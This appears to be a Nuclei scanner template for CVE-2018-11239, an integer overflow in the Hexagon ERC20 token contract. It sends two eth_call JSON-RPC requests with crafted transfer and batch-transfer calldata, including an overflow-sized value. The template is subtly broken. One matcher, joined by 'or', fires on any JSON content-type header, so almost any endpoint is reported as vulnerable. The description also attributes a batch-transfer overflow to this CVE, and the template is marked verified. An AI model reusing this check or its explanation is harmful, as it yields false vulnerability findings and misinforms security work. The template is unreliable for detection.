id: CVE-2018-11239

info:
  name: Hexagon (HXG) - Integer Overflow
  author: antigravity
  severity: high
  description: |
    Hexagon (HXG) ERC20 token contains an integer overflow caused by the _transfer function when handling large _value arguments.
    The vulnerability works by exploiting a missing check in the transfer logic, allowing a sender with insufficient balance to transfer tokens (underflow) or causing an overflow in batch transfers.
  reference:
    - https://peckshield.com/2018/05/18/burnOverflow/
    - https://github.com/projectdiscovery/nuclei-templates/issues/14644
    - https://etherscan.io/address/0xB5335e24d0aB29C190AB8C2B459238Da1153cEBA
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2018-11239
    cwe-id: CWE-190
  metadata:
    max-request: 2
    verified: true
  tags: cve,cve2018,ethereum,smart-contract,overflow,hxg

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0xB5335e24d0aB29C190AB8C2B459238Da1153cEBA","data":"0xa9059cbb000000000000000000000000dead00000000000000000000000000000000beef0000000000000000000000000000000000000000000000000000000000000001"}],"id":1}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0xB5335e24d0aB29C190AB8C2B459238Da1153cEBA","data":"0x83f12fec000000000000000000000000000000000000000000000000000000000000004080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000dead000000000000000000000000000000000000000000000000000000000000beef"}],"id":2}

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - '"result":"0x0000000000000000000000000000000000000000000000000000000000000001"'

      - type: word
        part: header
        words:
          - "application/json"
